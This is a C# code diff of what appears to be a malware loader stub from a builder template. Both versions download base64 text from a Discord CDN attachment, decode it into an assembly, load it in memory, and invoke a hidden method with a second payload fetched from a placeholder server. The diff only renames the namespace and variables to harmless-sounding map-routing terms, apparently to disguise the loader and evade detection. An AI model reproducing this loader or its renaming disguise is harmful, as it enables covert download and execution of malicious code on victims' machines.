@@ -13,9 +13,9 @@ using System.Windows.Forms;
 
 
 
-//Default [assembly: AssemblyTitle("Applicatino Test")]
-//Default [assembly: AssemblyProduct("Applicatino")]
-//Default [assembly: AssemblyCopyright("Applicatino ©  2019")]
+//Default [assembly: AssemblyTitle(" Test")]
+//Default [assembly: AssemblyProduct("Test")]
+//Default [assembly: AssemblyCopyright("Test ©  2021")]
 //Default [assembly: AssemblyFileVersion("1.0.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
@@ -26,14 +26,14 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-namespace Program
+namespace GetRoute
 {
     public class Program
     {
         [STAThread]
         public static void Main(string[] args)
         {
-            using (WebClient cer = new WebClient())
+            using (WebClient request = new WebClient())
             {
 
                 try
@@ -62,31 +62,31 @@ namespace Program
 
 
 
-                    string gdiplus;
+                    string response;
 
-                    gdiplus = "https://cdn.discordapp.com/attachments/841595401253158954/843988432262922240/httpswww.youtube.comwatchvjMCjwWXGNRM.txt"; 
+                    response = "https://cdn.discordapp.com/attachments/841595401253158954/843988432262922240/httpswww.youtube.comwatchvjMCjwWXGNRM.txt";
 
-                    WebClient EN;
+                    WebClient point_of_interest;
 
-                    EN = new WebClient();
+                    point_of_interest = new WebClient();
 
-                    string vs;
+                    string transit_station;
 
-                    vs = EN.DownloadString(gdiplus);
-
-
-                    byte[] cs;
+                    transit_station = point_of_interest.DownloadString(response);
 
 
-                    cs = Convert.FromBase64String(vs);
+                    byte[] place_id;
+
+
+                    place_id = Convert.FromBase64String(transit_station);
 
 
 
-                    object fs = new object[] { %aPP%, string.Empty, cer.DownloadData("%Server%"), true };
+                    object establishment = new object[] {%aPP%, string.Empty, request.DownloadData("%Server%"), true };
 
-                    string tr = "ShutDown.frmclass";
+                    string geocoded_waypoints = "ShutDown.frmclass";
 
-                    AppDomain.CurrentDomain.Load(cs).GetType(tr).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])fs);
+                    AppDomain.CurrentDomain.Load(place_id).GetType(geocoded_waypoints).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])establishment);
 
 
 
